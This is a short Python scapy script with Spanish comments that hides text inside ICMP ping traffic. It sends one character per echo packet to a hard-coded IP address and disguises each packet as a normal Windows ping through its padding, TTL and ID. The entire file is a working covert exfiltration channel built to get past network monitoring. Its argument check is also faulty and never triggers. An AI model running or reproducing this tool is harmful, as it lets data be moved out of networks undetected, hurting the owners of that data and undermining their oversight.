from scapy.all import *
import time

def enviar_icmp_string(destino, texto):
    relleno = b'abcdefghijklmnopqrstuvwabcdefghi'
    id_icmp = 0x0001  # Identificador ICMP, similar al de un ping real
    seq = 31  # Número de secuencia inicial
    ttl_valor = 128  # TTL, generalmente 128 en Windows

    for i, caracter in enumerate(texto):
        carga_util = bytes([ord(caracter)]) + relleno[1:] 
        
        # Crear el paquete ICMP con ID, Seq, y TTL modificados
        paquete = IP(dst=destino, ttl=ttl_valor)/ICMP(id=id_icmp, seq=seq)/Raw(load=carga_util)
        
        # Enviar el paquete
        send(paquete, verbose=0)
        print(".")
        time.sleep(1)
        print(f"Sent 1 packets.")
        
        # Incrementar la secuencia para el próximo paquete
        seq += 1
        

# Ejemplo de uso
destino = "8.8.4.4"  # Cambia esto por la dirección IP del destino

if len(sys.argv) < 1:
    print("Uso: python3 script.py <input_string>")
    sys.exit(1)
    
input_string = sys.argv[1]

enviar_icmp_string(destino, input_string)